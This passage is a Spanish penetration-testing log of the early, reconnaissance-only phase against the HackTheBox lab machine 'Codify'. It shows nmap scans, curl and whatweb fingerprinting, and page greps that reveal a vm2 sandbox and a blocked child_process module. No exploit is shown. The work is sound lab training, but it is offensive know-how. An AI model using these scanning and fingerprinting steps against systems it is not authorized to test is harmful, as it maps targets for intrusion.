9. propone ramas secundarias;
10. genera un resumen inicial;
11. deja escrito un siguiente paso único.

---

## Lectura didáctica del arranque

El objetivo de esta fase no es encontrar ya la vulnerabilidad principal, sino evitar empezar el caso de forma desordenada.

La ejecución de `Inici-HTB` permite responder rápidamente a preguntas básicas:

- ¿el objetivo responde?
- ¿qué puertos están abiertos?
- ¿qué servicios están expuestos?
- ¿hay una web dominante?
- ¿parece un entorno Linux o Windows?
- ¿aparece SSH, SMB, FTP, HTTP u otro servicio relevante?
- ¿qué rama del roadmap tiene más sentido abrir primero?

---

## Evidencia inicial que se debe revisar después del script

Tras ejecutar `Inici-HTB`, se revisan especialmente estos archivos:

```bash
cat nmap/ping.txt
cat nmap/whichSystem.txt
cat nmap/extractPorts.txt
cat nmap/nmap_tcp_services.txt
cat notes/00_resumen_inicial.md
cat notes/01_siguiente_paso.txt
```

La revisión no debe limitarse a mirar puertos. Hay que interpretar qué superficie domina el caso y qué rama merece prioridad.

---

## Criterio de decisión tras el arranque

La salida correcta de esta fase debe ser una decisión clara:

```text
Superficie dominante:
Rama principal:
Ramas secundarias:
Siguiente paso único:
```

Ejemplos de decisión:

- si domina HTTP/HTTPS → continuar con `WEB-BASE`;
- si aparece login o panel claro → valorar `WEB-AUTH / PANEL`;
- si aparecen SMB, Kerberos, LDAP y dominio → valorar rama `AD / SMB / KERBEROS`;
- si aparece una credencial reutilizable → valorar `CREDENCIALES`;
- si SSH queda abierto pero sin credenciales → dejarlo como rama secundaria.

---

## Nota metodológica

`Inici-HTB` no sustituye al análisis manual.

Su valor está en dejar el inicio de la máquina ordenado, repetible y documentado. A partir de sus resultados se debe revisar la evidencia, confirmar la superficie dominante y continuar con el roadmap correspondiente.

La regla principal es:

```text
no explotar por intuición;
decidir por evidencia observada.
```

### Ejecución

❯ Inici-HTB Codify 10.129.40.127 easy
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.40.127 (10.129.40.127) 56(84) bytes of data.
64 bytes from 10.129.40.127: icmp_seq=1 ttl=63 time=47.4 ms

--- 10.129.40.127 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 47.444/47.444/47.444/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.40.127 (ttl -> 63): Linux

[*] Lanzando escaneo completo de puertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-06 13:37 CEST
Initiating SYN Stealth Scan at 13:37
Scanning 10.129.40.127 [65535 ports]
Discovered open port 22/tcp on 10.129.40.127
Discovered open port 80/tcp on 10.129.40.127
Discovered open port 3000/tcp on 10.129.40.127
Completed SYN Stealth Scan at 13:37, 12.28s elapsed (65535 total ports)
Nmap scan report for 10.129.40.127
Host is up, received user-set (0.045s latency).
Scanned at 2026-05-06 13:37:04 CEST for 13s
Not shown: 65514 closed tcp ports (reset), 18 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds
           Raw packets sent: 66720 (2.936MB) | Rcvd: 65583 (2.623MB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 22,80,3000
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-06 13:37 CEST
Nmap scan report for 10.129.40.127
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/Codify/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/Codify/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

### Objetivo

Cerrar correctamente la **fase 1** de Codify y abrir la rama adecuada del roadmap sin saltar todavía a explotación.

El siguiente objetivo único es **normalizar el hostname `codify.htb`, comparar la web por puerto 80 y por puerto 3000, y confirmar qué superficie web manda realmente**.

### Hechos verificados

* La máquina responde correctamente.
* TTL `63`, compatible con Linux.
* `whichSystem.py` estima Linux.
* Puertos TCP abiertos detectados:

  * `22/tcp` — SSH.
  * `80/tcp` — HTTP Apache.
  * `3000/tcp` — HTTP Node.js Express.
* Nmap identifica:

  * `OpenSSH 8.9p1 Ubuntu`.
  * `Apache httpd 2.4.52`.
  * `Node.js Express framework`.
* El puerto `80` redirige a:

```text
http://codify.htb/
```

* El puerto `3000` muestra título:

```text
Codify
```

* El propio escaneo ya revela el hostname:

```text
codify.htb
```

### Suposiciones

* La superficie dominante inicial es **web**.
* SSH queda como rama secundaria porque está abierto, pero todavía no hay credenciales.
* El puerto `80` parece actuar como frontal o redirección hacia el hostname.
* El puerto `3000` probablemente expone directamente la aplicación Node.js/Express.
* Todavía no se da por válida ninguna vulnerabilidad: primero se confirma la aplicación, las rutas, la tecnología y el comportamiento.

### Método

Aplicamos el checklist de fase 1 actualizado:

1. objetivo validado;
2. conectividad confirmada;
3. puertos abiertos identificados;
4. servicios y versiones iniciales registradas;
5. superficie dominante elegida;
6. ramas secundarias anotadas;
7. siguiente paso único definido.

Decisión actual:

```text
Superficie dominante: HTTP / aplicación web
Rama principal: WEB-BASE
Ramas secundarias: SSH
Siguiente paso único: resolver codify.htb y observar la aplicación web por 80 y 3000
```

### Análisis

La primera salida de `Inici-HTB` es muy limpia: Codify empieza claramente como una máquina **web + SSH**.

La señal principal no es SSH, porque todavía no hay credenciales. La señal principal es la combinación:

```text
80/tcp  -> Apache con redirección a codify.htb
3000/tcp -> Node.js Express framework con título Codify
```

Por tanto, no corresponde buscar exploits ni preparar payloads en este punto. Corresponde completar **WEB-BASE** con orden:

* resolver `codify.htb`;
* comprobar si la web por `80` y por `3000` muestran lo mismo;
* extraer enlaces;
* localizar páginas informativas;
* identificar si hay editor, limitaciones, librerías, versiones o rutas útiles;
* decidir si se mantiene WEB-BASE o se pasa a análisis de producto/librería concreta.

### Comandos

Primero se añade el hostname al `/etc/hosts`.

```bash
echo "10.129.40.127 codify.htb" | sudo tee -a /etc/hosts
```

Por qué: Nmap ya ha visto que el puerto `80` redirige a `codify.htb`. Si el sistema atacante no resuelve ese nombre, el navegador o `curl` no podrán seguir bien la aplicación.

Resultado esperado: que `codify.htb` resuelva a la IP actual de la máquina.

Comprobación:

```bash
getent hosts codify.htb
```

---

A continuación se comparan las respuestas base.

```bash
curl -sS -I http://10.129.40.127
curl -sS -I http://codify.htb
curl -sS -I http://codify.htb:3000
```

Qué hace: pide solo cabeceras HTTP.

Elemento de interés:

* códigos `200`, `301`, `302`;
* cabecera `Location`;
* `Server`;
* cookies;
* diferencias entre IP, hostname y puerto `3000`.

---

Después se descarga el HTML inicial de cada superficie.

```bash
curl -sS http://codify.htb | head -n 80
curl -sS http://codify.htb:3000 | head -n 80
```

Qué hace: muestra el inicio del HTML.

Resultado esperado:

* título;
* enlaces;
* rutas internas;
* scripts;
* pistas de aplicación;
* diferencias entre `80` y `3000`.

---

Extraemos enlaces y recursos visibles.

```bash
curl -sS http://codify.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
curl -sS http://codify.htb:3000 | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
```

Elemento de interés:

* rutas tipo `/about`;
* rutas tipo `/editor`;
* rutas tipo `/limitations`;
* cualquier endpoint API;
* scripts JavaScript;
* recursos no enlazados claramente.

---

Fingerprint web básico.

```bash
whatweb http://codify.htb
whatweb http://codify.htb:3000
```

Qué hace: intenta identificar tecnologías visibles.

Resultado esperado confirmar:

* Apache como frontal;
* Node.js / Express como aplicación;
* si hay frameworks, librerías o cabeceras útiles.

---

Revisión rápida de rutas típicas sin fuzzing agresivo.

```bash
curl -sS http://codify.htb/robots.txt
curl -sS http://codify.htb:3000/robots.txt
```

Qué hace: comprueba si el sitio declara rutas que no quiere indexar.

Elemento de interés:

* rutas administrativas;
* rutas ocultas;
* endpoints;
* cualquier referencia a código, editor o restricciones.

### Comprobaciones

Tras ejecutar los comandos, deben registrarse especialmente estas salidas:

```bash
getent hosts codify.htb
curl -sS -I http://codify.htb
curl -sS -I http://codify.htb:3000
curl -sS http://codify.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
curl -sS http://codify.htb:3000 | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
whatweb http://codify.htb
whatweb http://codify.htb:3000
```

Con esa evidencia se determinará si:

```text
80 y 3000 son la misma aplicación
80 es solo frontal/proxy/redirección
3000 es la aplicación real
aparecen rutas de editor o documentación
aparece una librería o versión concreta
```
### Ejecución

❯ cd /home/r4mon/pentest/targets/HTB/easy/Codify
❯ sudo echo "10.129.40.127 codify.htb" | sudo tee -a /etc/hosts
[sudo] contraseña para r4mon:
10.129.40.127 codify.htb
❯ getent hosts codify.htb
10.129.40.127   codify.htb
❯ curl -sS -I http://10.129.40.127
curl -sS -I http://codify.htb
curl -sS -I http://codify.htb:3000
HTTP/1.1 301 Moved Permanently
Date: Wed, 06 May 2026 12:23:43 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://codify.htb/
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Wed, 06 May 2026 12:23:44 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38"
Content-Type: text/html; charset=UTF-8
Content-Length: 2269

HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38"
Content-Type: text/html; charset=UTF-8
Content-Length: 2269
Date: Wed, 06 May 2026 12:23:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5

❯ curl -sS http://codify.htb | head -n 80
curl -sS http://codify.htb:3000 | head -n 80
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Codify</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-light bg-light">
        <a class="navbar-brand" href="#">Codify</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link" href="/about">About us</a>
            </li>
          </ul>
        </div>
      </nav>
    <div class="container my-4">
        <div class="jumbotron text-center">
            <h1 class="display-4">Codify</h1>
            <p class="lead">Test your Node.js code easily.</p>
            <hr class="my-4">
            <p>This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.</p>
            <a class="btn btn-primary btn-lg" href="/editor" role="button">Try it now</a>
          </div>

        <p>Codify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation.</p>
        <p>Whether you're a developer, a student, or just someone who wants to experiment with Node.js, Codify makes it easy for you to write and test your code without any hassle.</p>
        <p>Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some <a href="/limitations">limitations</a>. We try our best to reduce these so that we can give you a better experience.</p>
        <p>So why wait? Start using Codify today and start writing and testing your Node.js code with ease!</p>
    </div>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Codify</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-light bg-light">
        <a class="navbar-brand" href="#">Codify</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link" href="/about">About us</a>
            </li>
          </ul>
        </div>
      </nav>
    <div class="container my-4">
        <div class="jumbotron text-center">
            <h1 class="display-4">Codify</h1>
            <p class="lead">Test your Node.js code easily.</p>
            <hr class="my-4">
            <p>This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.</p>
            <a class="btn btn-primary btn-lg" href="/editor" role="button">Try it now</a>
          </div>

        <p>Codify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation.</p>
        <p>Whether you're a developer, a student, or just someone who wants to experiment with Node.js, Codify makes it easy for you to write and test your code without any hassle.</p>
        <p>Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some <a href="/limitations">limitations</a>. We try our best to reduce these so that we can give you a better experience.</p>
        <p>So why wait? Start using Codify today and start writing and testing your Node.js code with ease!</p>
    </div>
</body>
</html>
❯ curl -sS http://codify.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
curl -sS http://codify.htb:3000 | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
#
/about
/editor
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
/limitations
#
/about
/editor
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
/limitations
❯ whatweb http://codify.htb
whatweb http://codify.htb:3000
http://codify.htb [200 OK] Apache[2.4.52], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.40.127], Title[Codify], X-Powered-By[Express]
http://codify.htb:3000 [200 OK] Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, IP[10.129.40.127], Title[Codify], X-Powered-By[Express]
❯ curl -sS http://codify.htb/robots.txt
curl -sS http://codify.htb:3000/robots.txt
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /robots.txt</pre>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /robots.txt</pre>
</body>
</html>
❯ getent hosts codify.htb
curl -sS -I http://codify.htb
curl -sS -I http://codify.htb:3000
curl -sS http://codify.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
curl -sS http://codify.htb:3000 | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
whatweb http://codify.htb
whatweb http://codify.htb:3000
10.129.40.127   codify.htb
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 12:24:51 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38"
Content-Type: text/html; charset=UTF-8
Content-Length: 2269

HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 11 Apr 2023 11:29:55 GMT
ETag: W/"8dd-18770145b38"
Content-Type: text/html; charset=UTF-8
Content-Length: 2269
Date: Wed, 06 May 2026 12:24:51 GMT
Connection: keep-alive
Keep-Alive: timeout=5

#
/about
/editor
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
/limitations
#
/about
/editor
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
/limitations
http://codify.htb [200 OK] Apache[2.4.52], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.40.127], Title[Codify], X-Powered-By[Express]
http://codify.htb:3000 [200 OK] Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, IP[10.129.40.127], Title[Codify], X-Powered-By[Express]

### Objetivo

Cerrar la observación inicial de **WEB-BASE** y pasar al siguiente paso único: revisar las rutas públicas relevantes de la aplicación para identificar la tecnología de sandbox y sus restricciones.

### Hechos verificados

`codify.htb` resuelve correctamente:

```text
10.129.40.127   codify.htb
```

El acceso por IP al puerto `80` redirige al hostname:

```text
HTTP/1.1 301 Moved Permanently
Location: http://codify.htb/
```

El acceso por `http://codify.htb` devuelve `200 OK` y muestra una aplicación Express detrás de Apache:

```text
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Length: 2269
```

El puerto `3000` devuelve la misma aplicación, también con Express:

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Length: 2269
```

Las rutas públicas visibles son:

```text
/about
/editor
/limitations
```

`robots.txt` no existe como recurso válido:

```text
Cannot GET /robots.txt
```

`whatweb` confirma:

```text
http://codify.htb      -> Apache 2.4.52 + Express + Bootstrap 4.3.1
http://codify.htb:3000 -> Express + Bootstrap 4.3.1
```

### Suposiciones

Apache en el puerto `80` actúa como frontal o proxy de la aplicación Node.js/Express.

El puerto `3000` expone directamente la misma aplicación Express.

La superficie dominante sigue siendo **web**, pero ya no como web genérica: a continuación la señal importante es una aplicación que permite ejecutar código Node.js en un entorno de sandbox.

SSH sigue siendo rama secundaria pendiente de credenciales.

### Método

La decisión se apoya en el sub-roadmap **WEB-BASE**:

```text
observación base
-> comparación 80/3000
-> extracción de rutas
-> identificación de backend
-> revisión de páginas informativas
-> decisión de rama específica
```

Corresponde revisar las páginas que la propia aplicación expone:

* `/about`, porque puede explicar tecnología interna;
* `/limitations`, porque puede revelar restricciones de seguridad;
* `/editor`, porque es la funcionalidad principal de ejecución de código.

Todavía no corresponde iniciar explotación. Primero se documenta qué indica la aplicación sobre su sandbox.

### Análisis

La fase WEB-BASE ya está bastante clara.

La aplicación no parece un CMS, no hay login, no hay panel autenticado y no aparecen descargas, storage ni artefactos públicos. La ruta principal es una aplicación Node.js/Express que ofrece ejecución de código en sandbox.

La señal dominante a continuación es esta frase del HTML inicial:

```text
Codify uses sandboxing technology to run your code.
```

Este hallazgo cambia el foco: ya no se trata de una web genérica, sino de **una aplicación que ejecuta código Node.js en sandbox**. La siguiente comprobación útil consiste en identificar la tecnología de sandbox y los módulos bloqueados.

### Comandos

Se guardan las tres rutas públicas para conservar evidencia limpia en el MD:

```bash
mkdir -p content/web

curl -sS http://codify.htb/about -o content/web/about.html
curl -sS http://codify.htb/limitations -o content/web/limitations.html
curl -sS http://codify.htb/editor -o content/web/editor.html
```

Por qué: estas páginas son la documentación pública de la propia aplicación. En este tipo de máquina, muchas veces la pista no está en un fuzzing enorme, sino en leer bien lo que el servicio declara.

Resultado esperado:

* nombre de la librería de sandbox;
* restricciones aplicadas;
* módulos bloqueados;
* comportamiento del editor;
* posibles endpoints usados por el editor.

---

Se extrae texto útil de esas páginas:

```bash
grep -RniE 'sandbox|node|vm2|module|require|child_process|limitations|restricted|editor|code' content/web/
```

Por qué: se busca términos relacionados con ejecución de código, aislamiento y restricciones.

Qué parte interesa:

* si aparece `vm2`;
* si se mencionan módulos prohibidos;
* si se explica cómo ejecutar el código;
* si aparece algún endpoint o comportamiento del backend.

---

Se revisan los enlaces de esas rutas:

```bash
for path in /about /limitations /editor; do
  echo "### $path"
  curl -sS "http://codify.htb$path" | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
  echo
done
```

Por qué: se busca identificar si esas páginas enlazan scripts, endpoints, rutas auxiliares o recursos no vistos en la landing.

---

Se revisa si el editor contiene formulario, `textarea`, scripts o llamadas a backend:

```bash
grep -niE 'form|textarea|script|fetch|axios|XMLHttpRequest|POST|run|code|editor' content/web/editor.html
```

Por qué: `/editor` es la funcionalidad real. Antes de probar nada, conviene entender qué envía el navegador al backend.

Resultado esperado:

* campo donde se introduce código;
* posible botón de ejecución;
* ruta usada para enviar el código;
* método HTTP;
* nombre del parámetro.

### Comprobaciones

Se registran las salidas de estos comandos:

```bash
grep -RniE 'sandbox|node|vm2|module|require|child_process|limitations|restricted|editor|code' content/web/

grep -niE 'form|textarea|script|fetch|axios|XMLHttpRequest|POST|run|code|editor' content/web/editor.html
```

Si la salida no es demasiado extensa, también se registra:

```bash
cat content/web/about.html
cat content/web/limitations.html
```

Con esa evidencia se cierra si el siguiente paso es:

```text
WEB-BASE -> análisis de librería sandbox / versionado
```

### Notas para el informe técnico

Bloque recomendable para añadir al MD:

```md
### Observación de la superficie web inicial

Tras resolver `codify.htb`, se comprobó que el puerto `80` redirige correctamente al hostname y que tanto `http://codify.htb` como `http://codify.htb:3000` muestran la misma aplicación.

El puerto `80` expone Apache como frontal, pero la cabecera `X-Powered-By: Express` y el puerto `3000` confirman que la aplicación real está desarrollada sobre Node.js/Express.

Las rutas públicas identificadas fueron `/about`, `/editor` y `/limitations`. La aplicación se presenta como un servicio para probar código Node.js dentro de un entorno de sandbox, por lo que la rama principal pasa de una web genérica a la revisión específica de la tecnología de aislamiento usada por la aplicación.
```

Estado actual:

```text
Hallazgo dominante: aplicación Node.js/Express con ejecución de código en sandbox
Rama principal activa: WEB-BASE
Ramas secundarias: SSH
Siguiente paso único: revisar /about, /limitations y /editor para identificar tecnología de sandbox y restricciones
```
### Ejecución

❯ mkdir -p content/web

curl -sS http://codify.htb/about -o content/web/about.html
curl -sS http://codify.htb/limitations -o content/web/limitations.html
curl -sS http://codify.htb/editor -o content/web/editor.html
❯ grep -RniE 'sandbox|node|vm2|module|require|child_process|limitations|restricted|editor|code' content/web/
content/web/about.html:20:              <a class="nav-link" href="/editor">Editor</a>
content/web/about.html:33:        <p>At Codify, our mission is to make it easy for developers to test their Node.js code. We understand that testing your code can be time-consuming and difficult, which is why we built this platform to simplify the process.</p>
content/web/about.html:34:        <p>Our team is made up of experienced developers who are passionate about creating tools that make development easier. We're committed to providing a reliable and secure platform that you can trust to test your code.</p>
content/web/about.html:35:        <p>Thank you for using Codify, and we hope that our platform helps you develop better Node.js applications.</p>
content/web/about.html:39:	           <h2 class="text-center mb-3"> About Our Code Editor</h2>
content/web/about.html:40:		           <p><strong></strong> Our code editor is a powerful tool that allows developers to write and test Node.js code in a user-friendly environment. You can write and run your JavaScript code directly in the browser, making it easy to experiment and debug your applications.</p>
content/web/about.html:41:				   <p><strong></strong> The </strong><a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" tar
content/web/about.html:42:				   get="_blank">vm2</a> library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.</p>
content/web/about.html:45:    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
content/web/limitations.html:7:    <title>Codify | Limitations</title>
content/web/limitations.html:19:              <a class="nav-link" href="/editor">Editor</a>
content/web/limitations.html:31:        <h1 class="text-center">Limitations</h1>
content/web/limitations.html:33:        <p>The Codify platform allows users to write and run Node.js code online, but there are certain limitations in place to ensure the security of the platform and its users.</p>
content/web/limitations.html:34:        <h4>Restricted Modules</h4>
content/web/limitations.html:35:        <p>The following Node.js modules have been restricted from importing:</p>
content/web/limitations.html:37:            <li>child_process</li>
content/web/limitations.html:42:        <h4>Module Whitelist</h4>
content/web/limitations.html:43:	<p>Only a limited set of modules are available to be imported. Some of them are listed below. If you need a specific module that is not available, please contact the administrator by mailing <a href='mailto:support@codify.htb'>support@codify.htb</a> while our ticketing system is being migrated. </p>
content/web/limitations.html:57:    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
content/web/editor.html:4:  <title>Codify | Editor</title>
content/web/editor.html:18:    #editor,
content/web/editor.html:23:    #editor {
content/web/editor.html:67:  <h1>Editor</h1>
content/web/editor.html:71:        <textarea id="code" rows="10" cols="50" class="form-control h-100"></textarea>
content/web/editor.html:81:        <button id="run-button" class="btn btn-primary btn-block" onclick="runCode()">Run</button>
content/web/editor.html:92:    function runCode() {
content/web/editor.html:93:      const code = document.getElementById('code').value;
content/web/editor.html:94:      const encodedCode = btoa(code);
content/web/editor.html:100:        body: JSON.stringify({ code: encodedCode })
❯ for path in /about /limitations /editor; do
  echo "### $path"
  curl -sS "http://codify.htb$path" | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
  echo
done
### /about
zsh: command not found: curl
zsh: command not found: grep
zsh: command not found: sort

### /limitations
zsh: command not found: curl
zsh: command not found: grep
zsh: command not found: sort

### /editor
zsh: command not found: curl
zsh: command not found: grep
zsh: command not found: sort

❯ grep -niE 'form|textarea|script|fetch|axios|XMLHttpRequest|POST|run|code|editor' content/web/editor.html
4:  <title>Codify | Editor</title>
18:    #editor,
23:    #editor {
67:  <h1>Editor</h1>
71:        <textarea id="code" rows="10" cols="50" class="form-control h-100"></textarea>
81:        <button id="run-button" class="btn btn-primary btn-block" onclick="runCode()">Run</button>
91:  <script>
92:    function runCode() {
93:      const code = document.getElementById('code').value;
94:      const encodedCode = btoa(code);
95:      fetch('/run', {
96:        method: 'POST',
100:        body: JSON.stringify({ code: encodedCode })
106:            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: red;">Error: ${data.error}</textarea>`;
108:            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: green;">${data.output}</textarea>`;
117:  </script>
❯ grep -RniE 'sandbox|node|vm2|module|require|child_process|limitations|restricted|editor|code' content/web/

grep -niE 'form|textarea|script|fetch|axios|XMLHttpRequest|POST|run|code|editor' content/web/editor.html
content/web/about.html:20:              <a class="nav-link" href="/editor">Editor</a>
content/web/about.html:33:        <p>At Codify, our mission is to make it easy for developers to test their Node.js code. We understand that testing your code can be time-consuming and difficult, which is why we built this platform to simplify the process.</p>
content/web/about.html:34:        <p>Our team is made up of experienced developers who are passionate about creating tools that make development easier. We're committed to providing a reliable and secure platform that you can trust to test your code.</p>
content/web/about.html:35:        <p>Thank you for using Codify, and we hope that our platform helps you develop better Node.js applications.</p>
content/web/about.html:39:	           <h2 class="text-center mb-3"> About Our Code Editor</h2>
content/web/about.html:40:		           <p><strong></strong> Our code editor is a powerful tool that allows developers to write and test Node.js code in a user-friendly environment. You can write and run your JavaScript code directly in the browser, making it easy to experiment and debug your applications.</p>
content/web/about.html:41:				   <p><strong></strong> The </strong><a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" tar
content/web/about.html:42:				   get="_blank">vm2</a> library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.</p>
content/web/about.html:45:    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
content/web/limitations.html:7:    <title>Codify | Limitations</title>
content/web/limitations.html:19:              <a class="nav-link" href="/editor">Editor</a>
content/web/limitations.html:31:        <h1 class="text-center">Limitations</h1>
content/web/limitations.html:33:        <p>The Codify platform allows users to write and run Node.js code online, but there are certain limitations in place to ensure the security of the platform and its users.</p>
content/web/limitations.html:34:        <h4>Restricted Modules</h4>
content/web/limitations.html:35:        <p>The following Node.js modules have been restricted from importing:</p>
content/web/limitations.html:37:            <li>child_process</li>
content/web/limitations.html:42:        <h4>Module Whitelist</h4>
content/web/limitations.html:43:	<p>Only a limited set of modules are available to be imported. Some of them are listed below. If you need a specific module that is not available, please contact the administrator by mailing <a href='mailto:support@codify.htb'>support@codify.htb</a> while our ticketing system is being migrated. </p>
content/web/limitations.html:57:    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
content/web/editor.html:4:  <title>Codify | Editor</title>
content/web/editor.html:18:    #editor,
content/web/editor.html:23:    #editor {
content/web/editor.html:67:  <h1>Editor</h1>
content/web/editor.html:71:        <textarea id="code" rows="10" cols="50" class="form-control h-100"></textarea>
content/web/editor.html:81:        <button id="run-button" class="btn btn-primary btn-block" onclick="runCode()">Run</button>
content/web/editor.html:92:    function runCode() {
content/web/editor.html:93:      const code = document.getElementById('code').value;
content/web/editor.html:94:      const encodedCode = btoa(code);
content/web/editor.html:100:        body: JSON.stringify({ code: encodedCode })
4:  <title>Codify | Editor</title>
18:    #editor,
23:    #editor {
67:  <h1>Editor</h1>
71:        <textarea id="code" rows="10" cols="50" class="form-control h-100"></textarea>
81:        <button id="run-button" class="btn btn-primary btn-block" onclick="runCode()">Run</button>
91:  <script>
92:    function runCode() {
93:      const code = document.getElementById('code').value;
94:      const encodedCode = btoa(code);
95:      fetch('/run', {
96:        method: 'POST',
100:        body: JSON.stringify({ code: encodedCode })
